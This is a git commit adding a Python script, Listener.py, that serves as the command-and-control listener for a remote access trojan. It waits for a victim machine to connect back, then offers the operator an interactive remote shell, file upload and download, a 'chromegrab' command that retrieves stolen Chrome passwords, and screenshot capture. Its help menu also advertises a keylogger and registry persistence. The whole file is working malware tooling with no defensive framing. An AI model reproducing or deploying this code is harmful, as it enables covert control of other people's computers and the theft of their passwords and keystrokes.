ca2e63cbe4c70568bf566f87e2579a475243aad9
polymaster3313 <93959737+polymaster3313@users.noreply.github.com>
2022-12-07 20:25:41 +0800

    Create Listener.py

---
+++ Listener.py
@@ -0,0 +1,105 @@
+import socket
+import termcolor
+import json
+import os
+import time
+
+
+def reliable_recv():
+    data = ''
+    while True:
+        try:
+            data = data + target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def reliable_send(data):
+    jsondata = json.dumps(data)
+    target.send(jsondata.encode())
+
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    target.send(f.read())
+
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
+
+
+def target_communication():
+    count = 0
+    while True:
+        command = input('* Shell~%s: ' % str(ip))
+        reliable_send(command)
+        if command == 'quit':
+            break
+        elif command == 'clear':
+            os.system('clear')
+        elif command[:3] == 'cd ':
+            pass
+        elif command[:6] == 'upload':
+            upload_file(command[7:])
+        elif command[:8] == 'download':
+            download_file(command[9:])
+        elif command [:10] == "chromegrab":
+            time.sleep(5)
+            download_file("log.txt")
+            print("the passwords are saved in log.txt")
+        elif command[:10] == 'screenshot':
+            f = open('screenshot%d' % (count), 'wb')
+            target.settimeout(3)
+            chunk = target.recv(1024)
+            while chunk:
+                f.write(chunk)
+                try:
+                    chunk = target.recv(1024)
+                except socket.timeout as e:
+                    break
+            target.settimeout(None)
+            f.close()
+            count += 1
+        elif command == 'help':
+	            print(termcolor.colored('''\n
+                quit                                --> Quit Session With The Target
+                clear                               --> Clear The Screen
+                cd *Directory Name*                 --> Changes Directory On Target System
+                upload *file name*                  --> Upload File To The target Machine
+                download *file name*                --> Download File From Target Machine
+                keylog_start                        --> Start The Keylogger
+                keylog_dump                         --> Print Keystrokes That The Target Inputted
+                keylog_stop                         --> Stop And Self Destruct Keylogger File
+                persistence *RegName* *fileName*    --> Create Persistence In Registry''', 'green'))
+        else:
+            result = reliable_recv()
+            print(result)
+
+print("""
+
+
+██████╗░░█████╗░██╗░░░░░██╗░░░██╗░█████╗░██████╗░
+██╔══██╗██╔══██╗██║░░░░░╚██╗░██╔╝██╔══██╗╚════██╗
+██████╔╝██║░░██║██║░░░░░░╚████╔╝░██║░░╚═╝░░███╔═╝
+██╔═══╝░██║░░██║██║░░░░░░░╚██╔╝░░██║░░██╗██╔══╝░░
+██║░░░░░╚█████╔╝███████╗░░░██║░░░╚█████╔╝███████╗
+
+-made by polyester""")
+
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('192.168.10.116', 5555))
+print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
+sock.listen(5)
+target, ip = sock.accept()
+print(termcolor.colored('[+] Target Connected From: ' + str(ip), 'green'))
+print(termcolor.colored("'help' for options", 'green'))
+target_communication()
